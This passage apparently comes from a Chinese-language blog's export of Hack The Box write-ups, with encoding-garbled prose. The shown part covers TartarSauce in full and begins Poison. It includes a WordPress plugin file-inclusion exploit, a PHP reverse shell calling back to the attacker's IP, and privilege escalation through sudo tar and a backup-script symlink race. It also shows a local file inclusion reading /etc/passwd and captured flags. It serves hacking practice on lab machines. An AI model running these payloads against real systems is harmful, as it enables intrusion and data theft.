fingerprint:\nOS:SCAN(V=7.93%E=4%D=2/11%OT=80%CT=1%CU=43534%PV=Y%DS=2%DC=T%G=Y%TM=63E78A9\nOS:C%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=A)SEQ\nOS:(SP=108%GCD=1%ISR=10D%TI=Z%II=I%TS=A)OPS(O1=M537ST11NW7%O2=M537ST11NW7%O\nOS:3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11NW7%O6=M537ST11)WIN(W1=7120%W2=\nOS:7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M537NNSN\nOS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D\nOS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O\nOS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W\nOS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R\nOS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 256/tcp)\nHOP RTT       ADDRESS\n1   117.74 ms 10.10.16.1\n2   74.70 ms  10.10.10.88\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 44.31 seconds\n```\n## Http\n![](Hackthebox-TartarSauce/XbqDpUuXQ7gm0y8MheSMN27-njpRR4k1Iwc3hyKGsqs.png)\n\nè¿™ä»€ä¹ˆç©æ„å„¿ï¼Œè™½ç„¶çŸ¥é“æ˜¯å­—ç¬¦ç»„æˆçš„å›¾æ¡ˆï¼Œä½†æ˜¯æˆ‘ç¡®å®çœ‹ä¸å‡ºæ¥æ˜¯å•¥\n\n```bash\n<!--Carry on, nothing to see here :D-->\n```\næºä»£ç æ‹‰åˆ°æœ€åº•ä¸‹ï¼Œæœ‰ä¸€å¥è¿™é‡Œæ²¡ä»€ä¹ˆå¥½çœ‹çš„ï¼ŒæŒºçš®çš„\n\n```bash\n/webservices/tar/tar/source/ \n/webservices/monstra-3.0.4/\n/webservices/easy-file-uploader/ \n/webservices/developmental/\n/webservices/phpmyadmin/\n```\nåœ¨ nmap æ‰«æçš„æ—¶å€™ï¼Œæœ‰å‡ ä¸ªç›®å½•ï¼ŒæŒ¨ä¸ªå»çœ‹ä¸€ä¸‹\n\n`http://10.10.10.88/webservices/monstra-3.0.4/` ç„¶ååªæœ‰è¿™ä¸€ä¸ªåœ°å€å¯ä»¥è®¿é—®\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# searchsploit monstra 3.0.4    \n--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                   |  Path\n--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nMonstra CMS 3.0.4 - (Authenticated) Arbitrary File Upload / Remote Code Execution                                                                                                | php/webapps/43348.txt\nMonstra CMS 3.0.4 - Arbitrary Folder Deletion                                                                                                                                    | php/webapps/44512.txt\nMonstra CMS 3.0.4 - Authenticated Arbitrary File Upload                                                                                                                          | php/webapps/48479.txt\nMonstra cms 3.0.4 - Persitent Cross-Site Scripting                                                                                                                               | php/webapps/44502.txt\nMonstra CMS 3.0.4 - Remote Code Execution (Authenticated)                                                                                                                        | php/webapps/49949.py\nMonstra CMS < 3.0.4 - Cross-Site Scripting (1)                                                                                                                                   | php/webapps/44855.py\nMonstra CMS < 3.0.4 - Cross-Site Scripting (2)                                                                                                                                   | php/webapps/44646.txt\nMonstra-Dev 3.0.4 - Cross-Site Request Forgery (Account Hijacking)                                                                                                               | php/webapps/45164.txt\n--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\nè¿™ä¸ªç‰ˆæœ¬çš„ Monstra CMS ç¡®å®æ˜¯å¯ä»¥æœç´¢åˆ°æ¼æ´ï¼Œè¿™ä¸ªå…ˆä¸æ€¥ç€çœ‹\n\n![](Hackthebox-TartarSauce/iDlsdUwiKtkX1_NW707_fjjTfOWZI3wIHYJJ8rTiLEc.png)\n\nç‚¹å‡»é¦–é¡µçš„ç™»å½•ï¼Œå¯ä»¥è¿›å…¥ç™»å½•é¡µé¢\n\n![](Hackthebox-TartarSauce/KIZu6PkFGOUI66atVy_1dVwalwBg70ljx_S9Mds-gwM.png)\n\nå¼±å£ä»¤ admin/admin æˆåŠŸç™»å½•\n\næ ¹æ®æˆ‘ä»¬æ‰¾åˆ°çš„å‡ ä¸ªæ¼æ´ï¼Œå…¶ä¸­ä¸€ä¸ªä¸ºæ–‡ä»¶ä¸Šä¼ ï¼Œæˆ‘ exploit åˆ©ç”¨æ²¡æˆåŠŸï¼Œæˆ‘å»æ‰‹åŠ¨è¯•è¯•\n\nç‚¹å‡» Dashboard -> upload file -> select file -> upload\n\n![](Hackthebox-TartarSauce/LsGslvLMiJjHisKe383Kn92-CC09YEszbeaCqS9z1fg.png)\n\nè¿™é‡Œåˆ©ç”¨æ²¡æœ‰æˆåŠŸï¼Œæˆ‘åˆç¢ç£¨äº†ä¸€é˜µï¼Œå‘ç°æ˜¯ä¸ªå…”å­æ´\n\n## Fuzz\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ffuf -u \"http://10.10.10.88/webservices/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.10.88/webservices/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 200\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n________________________________________________\n\nwp                      [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 93ms]\n                        [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 75ms]\n:: Progress: [30000/30000] :: Job [1/1] :: 219 req/sec :: Duration: [0:00:26] :: Errors: 2 ::\n```\nè¿™é‡Œå‘ç°æœ‰ä¸ª wp\n\n![](Hackthebox-TartarSauce/7GbneiIK6JODYwFQsNlE0TQr-qPip5fWpiD0dtV8XwI.png)\n\nä½†æ˜¯æ²¡æœ‰é¡µé¢\n\nå°è¯•è®¿é—® `http://10.10.10.88/webservices/wp/wp-admin/` çš„æ—¶å€™ï¼Œè·³è½¬åˆ°äº† `tartarsauce.htb` ï¼Œå»åŠ å…¥ä¸€ä¸ª hosts è§£æ\n\n```bash\necho 10.10.10.88 tartarsauce.htb >> /etc/hosts\n```\n![](Hackthebox-TartarSauce/fRJdFpiu8A0WrXKO51rYxYR4jpKK7wwmKEBZsNXZL2E.png)\n\nç„¶åå†è®¿é—®å°±æœ‰é¡µé¢äº†ï¼Œå’±ä»¬å»è®¿é—®ä¸€ä¸‹ wp-admin é¡µé¢\n\n![](Hackthebox-TartarSauce/samtLgMBiZ5iW5IyEFbC0eAYSXoFzbZRoOOnz9liaLg.png)\n\næˆåŠŸæ‰¾åˆ°åå°ï¼Œè¿™ä¸ªæ—¶å€™å»ä½¿ç”¨ wpscan æ‰«æä¸€ä¸‹\n\n## Wpscan\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# wpscan --url http://10.10.10.88/webservices/wp/ --enumerate p --plugins-detection aggressive\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ Â®\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.22\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://10.10.10.88/webservices/wp/ [10.10.10.88]\n[+] Started: Sat Feb 11 21:10:03 2023\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://10.10.10.88/webservices/wp/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://10.10.10.88/webservices/wp/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://10.10.10.88/webservices/wp/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06).\n | Found By: Emoji Settings (Passive Detection)\n |  - http://10.10.10.88/webservices/wp/, Match: 'wp-includes\\/js\\/wp-emoji-release.min.js?ver=4.9.4'\n | Confirmed By: Meta Generator (Passive Detection)\n |  - http://10.10.10.88/webservices/wp/, Match: 'WordPress 4.9.4'\n\n[i] The main theme could not be detected.\n\n[+] Enumerating Most Popular Plugins (via Aggressive Methods)\n Checking Known Locations - Time: 00:00:50 <=================================================================================================================================> (1500 / 1500) 100.00% Time: 00:00:50\n[+] Checking Plugin Versions (via Passive and Aggressive Methods)\n\n[i] Plugin(s) Identified:\n\n[+] akismet\n | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/\n | Last Updated: 2022-12-01T17:18:00.000Z\n | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt\n | [!] The version is out of date, the latest version is 5.0.2\n |\n | Found By: Known Locations (Aggressive Detection)\n |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/, status: 200\n |\n | Version: 4.0.3 (100% confidence)\n | Found By: Readme - Stable Tag (Aggressive Detection)\n |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt\n | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)\n |  - http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt\n\n[+] gwolle-gb\n | Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/\n | Last Updated: 2023-01-24T11:28:00.000Z\n | Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt\n | [!] The version is out of date, the latest version is 4.5.0\n |\n | Found By: Known Locations (Aggressive Detection)\n |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200\n |\n | Version: 2.3.10 (100% confidence)\n | Found By: Readme - Stable Tag (Aggressive Detection)\n |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt\n | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)\n |  - http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt\n\n[!] No WPScan API Token given, as a result vulnerability data has not been output.\n[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register\n\n[+] Finished: Sat Feb 11 21:10:56 2023\n[+] Requests Done: 1511\n[+] Cached Requests: 31\n[+] Data Sent: 449.789 KB\n[+] Data Received: 272.615 KB\n[+] Memory used: 194.531 MB\n[+] Elapsed time: 00:00:53\n```\nå¯ä»¥å¾—çŸ¥ wordpress ç‰ˆæœ¬æ˜¯ 4.9.ï¼Œå¹¶ä¸”æœ‰ä¸€ä¸ª Gwolle æ’ä»¶ï¼Œåˆ‡åœ¨æ’ä»¶çš„ readme é¡µé¢ä¸­æœ‰è¯´æ˜ç‰ˆæœ¬å·ä¸º 1.5.3\n\n> [https://www.exploit-db.com/exploits/38861](https://www.exploit-db.com/exploits/38861)\n\næ ¹æ®æè¿°ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªæ¼æ´\n\n# æ¼æ´åˆ©ç”¨\næ ¹æ®æ¼æ´ä¸­çš„æè¿°ï¼Œæˆ‘ä»¬æ¥æ„é€ ä¸€ä¸‹ exploit\n\n```bash\nhttp://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]\n\ncurl -s http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.16.6/\n```\nä¸Šé¢æ˜¯æˆ‘ä»¬ä¹‹åè¦è¿è¡Œçš„å†…å®¹\n\n```bash\n<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.6/4444 0>&1'\") ?>\n```\nä¸Šé¢æ˜¯æˆ‘ä»¬çš„ exploit è¯·æ±‚çš„ shell æ–‡ä»¶çš„å†…å®¹ï¼Œæ–‡ä»¶åå­—ä¸º wp-load.php\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# python3 -m http.server 80                                                             \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\næ¥ç€ä½¿ç”¨ python3 è¿è¡Œä¸€ä¸ª http æœåŠ¡å™¨\n\n```bash\nnc -nvlp 4444\n```\næ¥ç€ä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£\n\næœ€åå»æ‰§è¡Œæˆ‘ä»¬çš„ exploit\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# rlwrap nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.16.6] from (UNKNOWN) [10.10.10.88] 33670\nbash: cannot set terminal process group (1261): Inappropriate ioctl for device\nbash: no job control in this shell\n</wp/wp-content/plugins/gwolle-gb/frontend/captcha$ whoami&&id\nwhoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\næˆåŠŸè¿”å› shell\n\n# æƒé™æå‡\n## User\n```bash\n</wp/wp-content/plugins/gwolle-gb/frontend/captcha$ sudo -l\nsudo -l\nMatching Defaults entries for www-data on TartarSauce:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser www-data may run the following commands on TartarSauce:\n    (onuma) NOPASSWD: /bin/tar\n```\nä½¿ç”¨ `sudo -l` å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ onuma æƒé™æ‰§è¡Œ `/bin/tar` \n\n> [https://gtfobins.github.io/gtfobins/tar/](https://gtfobins.github.io/gtfobins/tar/)\n\n![](Hackthebox-TartarSauce/CuT7l_OxvG7V09LZWYifGLJnK3a3anrT16MtDRef3fQ.png)\n\n```bash\nsudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh\n```\n```bash\nwhoami&&id\nonuma\nuid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)\n```\næˆåŠŸææƒåˆ° user æƒé™\n\n```bash\ncat user.txt\n140682a65dccf6fbd674edb57692ae4c\n```\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n## Root\n```bash\n2023/02/11 08:40:29 CMD: UID=0     PID=3580   | /bin/bash /usr/sbin/backuperer \n```\nè¿è¡Œ pspy å¯ä»¥çœ‹åˆ°ï¼Œä¼šå®šæ—¶ä»¥ root æƒé™æ‰§è¡Œ /usr/sbin/backuperer è¿™ä¸ªæ–‡ä»¶ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹\n\n```bash\nfile /usr/sbin/backuperer \n/usr/sbin/backuperer: Bourne-Again shell script, UTF-8 Unicode text executable\n\ncat /usr/sbin/backuperer \n#!/bin/bash\n\n#-------------------------------------------------------------------------------------\n# backuperer ver 1.0.2 - by ÈœÓÅ—gÍ·Í¼Èœ\n# ONUMA Dev auto backup program\n# This tool will keep our webapp backed up incase another skiddie defaces us again.\n# We will be able to quickly restore from a backup in seconds ;P\n#-------------------------------------------------------------------------------------\n\n# Set Vars Here\nbasedir=/var/www/html\nbkpdir=/var/backups\ntmpdir=/var/tmp\ntestmsg=$bkpdir/onuma_backup_test.txt\nerrormsg=$bkpdir/onuma_backup_error.txt\ntmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)\ncheck=$tmpdir/check\n\n# formatting\nprintbdr()\n{\n    for n in $(seq 72);\n    do /usr/bin/printf $\"-\";\n    done\n}\nbdr=$(printbdr)\n\n# Added a test file to let us see when the last backup was run\n/usr/bin/printf $\"$bdr\\nAuto backup backuperer backup last ran at : $(/bin/date)\\n$bdr\\n\" > $testmsg\n\n# Cleanup from last time.\n/bin/rm -rf $tmpdir/.* $check\n\n# Backup onuma website dev files.\n/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &\n\n# Added delay to wait for backup to complete if large files get added.\n/bin/sleep 30\n\n# Test the backup integrity\nintegrity_chk()\n{\n    /usr/bin/diff -r $basedir $check$basedir\n}\n\n/bin/mkdir $check\n/bin/tar -zxvf $tmpfile -C $check\nif [[ $(integrity_chk) ]]\nthen\n    # Report errors so the dev can investigate the issue.\n    /usr/bin/printf $\"$bdr\\nIntegrity Check Error in backup last ran :  $(/bin/date)\\n$bdr\\n$tmpfile\\n\" >> $errormsg\n    integrity_chk >> $errormsg\n    exit 2\nelse\n    # Clean up and save archive to the bkpdir.\n    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak\n    /bin/rm -rf $check .*\n    exit 0\nfi\n```\n### è„šæœ¬åˆ†æ\n```bash\nç”Ÿæˆå·¥ä½œç›®å½•å’Œéšæœºä¸´æ—¶æ–‡ä»¶å\næ‰“å°æ ‡é¢˜\nç”Ÿæˆæµ‹è¯•æ¶ˆæ¯\næ¸…ç†\nå°†ç”¨æˆ·ä¸Šä¸‹æ–‡æ›´æ”¹ä¸º onuma å¹¶å°† /var/www/html å¤‡ä»½åˆ°ä¸´æ—¶æ–‡ä»¶ä¸­\nç¡ 30 ç§’\nåˆ›å»ºç”¨äºå®Œæ•´æ€§æ£€æŸ¥çš„ç›®å½•\nunatar æ–°å»ºæ–‡ä»¶åˆ°checkç›®å½•\næ‰§è¡Œ diff ä»¥æ£€æŸ¥å­˜æ¡£å’Œæ–‡ä»¶ç³»ç»Ÿä¹‹é—´çš„å·®å¼‚\nå¦‚æœæ²¡æœ‰å·®å¼‚æ¸…ç†å¹¶ä¿å­˜æ–°åˆ›å»ºçš„å­˜æ¡£ï¼Œå¤‡ä»½æ—§çš„\nå¦åˆ™å°†æ‰€æœ‰å·®å¼‚è®°å½•åˆ°æ—¥å¿—æ–‡ä»¶\n```\n### åˆ©ç”¨\nä½¿ç”¨ www-data ç”¨æˆ·åœ¨ /var/www/html ä¸‹åˆ›å»ºç©ºæ–‡ä»¶\n\n```bash\n</wp/wp-content/plugins/gwolle-gb/frontend/captcha$ cd /var/www/html\ncd /var/www/html\nwww-data@TartarSauce:/var/www/html$ id\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nwww-data@TartarSauce:/var/www/html$ touch 1\ntouch 1\n```\nä½¿ç”¨ onuma ç”¨æˆ·åœ¨ /var/tmp ä¸‹åˆ›å»º var/www/html/ ç»“æ„ï¼Œå°† /root/root.txt é“¾æ¥åˆ° 1\n\n```bash\ncd /var/tmp\npwd\n/var/tmp\nid\nuid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)\nmkdir -p var/www/html\ncd var/www/html\nln -s /root/root.txt 1\nls -la\ntotal 8\ndrwxr-xr-x 2 onuma onuma 4096 Feb 11 09:06 .\ndrwxr-xr-x 3 onuma onuma 4096 Feb 11 09:05 ..\nlrwxrwxrwx 1 onuma onuma   14 Feb 11 09:06 1 -> /root/root.txt\n```\nåœ¨ /var/tmp ä¸­åˆ›å»º tar å­˜æ¡£\n\n```bash\ncd /var/tmp\n/bin/tar -zcvf a.tgz var/www/html\nvar/www/html/\nvar/www/html/1\n```\nç­‰å¾…è„šæœ¬æ‰§è¡Œï¼Œå¹¶åœ¨ 30 ç§’å†…å°† a.tgz å¤åˆ¶åˆ°ä¸´æ—¶å­˜æ¡£\n\n```bash\nls -la\ntotal 112\ndrwxrwxrwt 11 root  root   4096 Feb 11 09:10 .\ndrwxr-xr-x 14 root  root   4096 May 12  2022 ..\n-rw-r--r--  1 onuma onuma 65536 Feb 11 09:10 .816e92e4f61e2b8dce68f5779ed42ad70a562348\n-rw-r--r--  1 onuma onuma   154 Feb 11 09:08 a.tgz\ndrwxr-xr-x  3 onuma onuma  4096 Feb 11 09:05 var\ncp a.tgz .816e92e4f61e2b8dce68f5779ed42ad70a562348\n```\nç­‰å¾…æ£€æŸ¥å®Œæˆ\n\næ£€æŸ¥ /var/backups ä¸‹çš„æ—¥å¿—æ–‡ä»¶ onuma\\_backup\\_error.txtï¼Œå› ä¸ºå®ƒå°†åŒ…å«æ¥è‡ª /var/www/html å’Œ a.tgz å­˜æ¡£çš„æ–‡ä»¶ä¹‹é—´çš„æŸ¥æ„ï¼Œå³ /root/root.txt çš„å†…å®¹\n\n```bash\ncat /var/backups/onuma_backup_error.txt\n...\n------------------------------------------------------------------------\nIntegrity Check Error in backup last ran :  Thu Jan 21 05:38:54 EST 2021\n------------------------------------------------------------------------\n/var/tmp/.379fe8e77f9f84a66b9a6df9a452d10499713829\nBinary files /var/www/html/webservices/wp/.wp-config.php.swp and /var/tmp/check/var/www/html/webservices/wp/.wp-config.php.swp differ\n------------------------------------------------------------------------\nIntegrity Check Error in backup last ran :  Sat Feb 11 09:11:14 EST 2023\n------------------------------------------------------------------------\n/var/tmp/.816e92e4f61e2b8dce68f5779ed42ad70a562348\ndiff -r /var/www/html/1 /var/tmp/check/var/www/html/1\n0a1\n> 2066572c29f0ffd2a77ee5e5c2e77703\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Poison - Hackthebox","url":"/2023/02/08/Hackthebox/Medium/Hackthebox-Poison/","content":"\n# Hackthebox - Poison\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Poison/r2g4g065_PzTZVqmj6rTj-PmaylYAxegkrD_uJsgYzA.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Poison/cQwb7l8LFd3cSGxHASQTLKQE4CfqFQE2w3H_TU2DXSw.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 10000 10.10.10.84\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-02-08 18:38 CST\nWarning: 10.10.10.84 giving up on port because retransmission cap hit (10).\nNmap scan report for 10.10.10.84\nHost is up (0.078s latency).\nNot shown: 52168 filtered tcp ports (no-response), 13365 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)\n| ssh-hostkey: \n|   2048 e33b7d3c8f4b8cf9cd7fd23ace2dffbb (RSA)\n|   256 4ce8c602bdfc83ffc98001547d228172 (ECDSA)\n|_  256 0b8fd57185901385618beb34135f943b (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\n|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.93%E=4%D=2/8%OT=22%CT=8%CU=32827%PV=Y%DS=2%DC=T%G=Y%TM=63E37C05\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=Z%II=RI%TS=20)OP\nOS:S(O1=M537NW6ST11%O2=M537NW6ST11%O3=M280NW6NNT11%O4=M537NW6ST11%O5=M218NW\nOS:6ST11%O6=M109ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)EC\nOS:N(R=Y%DF=Y%T=40%W=FFFF%O=M537NW6SLL%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=FFFF%S=O%A=S+%F=AS%O=M109NW6ST11%RD\nOS:=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S\nOS:=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=38%UN=0%R\nOS:IPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=S%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd\n\nTRACEROUTE (using port 1720/tcp)\nHOP RTT       ADDRESS\n1   122.13 ms 10.10.16.1\n2   77.21 ms  10.10.10.84\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 89.22 seconds\n```\n## Http\n![](Hackthebox-Poison/ytG2G3HzgLZesq8DA87kxXnqd8oA6gBjqV5kftcFXy4.png)\n\nä¼¼ä¹æ˜¯ä¸€ä¸ªæœ¬åœ°è„šæœ¬åŠ è½½çš„ä¸€ä¸ªç¨‹åºï¼ŒæŒ¨ä¸ªçœ‹ä¸€ä¸‹æ˜¯å¦æœ‰ä»€ä¹ˆå¯ç”¨çš„ä¸œè¥¿\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# curl http://10.10.10.84/browse.php?file=listfiles.php\nArray\n(\n    [0] => .\n    [1] => ..\n    [2] => browse.php\n    [3] => index.php\n    [4] => info.php\n    [5] => ini.php\n    [6] => listfiles.php\n    [7] => phpinfo.php\n    [8] => pwdbackup.txt\n)\n```\n# æ¼æ´åˆ©ç”¨\næœ‰ç‚¹ä¸œè¥¿ï¼Œè¿™æ˜¯åˆ—å‡ºäº†ä¸€ä¸ªåˆ—è¡¨å§ï¼Œç„¶åçœ‹åˆ°æ–‡ä»¶ç»“æ„ï¼Œçªç„¶æƒ³åˆ°æ˜¯å¦ä¼šæœ‰ LFI å‘¢ï¼Ÿå°è¯•ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# curl http://10.10.10.84/browse.php?file=/etc/passwd\n# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $\n#\nroot:*:0:0:Charlie &:/root:/bin/csh\ntoor:*:0:0:Bourne-again Superuser:/root:\ndaemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin\noperator:*:2:5:System &:/:/usr/sbin/nologin\nbin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin\ntty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin\nkmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin\ngames:*:7:13:Games pseudo-user:/:/usr/sbin/nologin\nnews:*:8:8:News Subsystem:/:/usr/sbin/nologin\nman:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin\nsshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin\nsmmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin\nmailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin\nbind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin\nunbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin\nproxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin\n_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin\n_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin\nuucp:*:66:66:UUCP 